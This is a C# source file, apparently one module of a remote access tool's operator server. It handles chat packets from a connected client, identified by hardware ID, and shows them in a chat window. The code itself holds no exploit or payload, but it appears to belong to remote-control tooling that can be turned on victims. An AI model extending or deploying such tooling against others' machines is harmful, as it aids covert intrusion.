using Server.Forms;
using Server.MessagePack;
using Server.Connection;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    public class HandleChat
    {
        public void Read(MsgPack unpack_msgpack, Clients client)
        {
            try
            {
                FormChat chat = (FormChat)Application.OpenForms["chat:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                if (chat != null)
                {
                    Console.Beep();
                    chat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                    chat.richTextBox1.SelectionStart = chat.richTextBox1.TextLength;
                    chat.richTextBox1.ScrollToCaret();
                }
                else
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "chatExit";
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    client.Disconnected();
                }
            }
            catch { }
        }

        public void GetClient(MsgPack unpack_msgpack, Clients client)
        {
            FormChat chat = (FormChat)Application.OpenForms["chat:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
            if (chat != null)
            {
                if (chat.Client == null)
                {
                    chat.Client = client;
                    chat.textBox1.Enabled = true;
                    chat.timer1.Enabled = true;
                }

            }
        }
    }
}
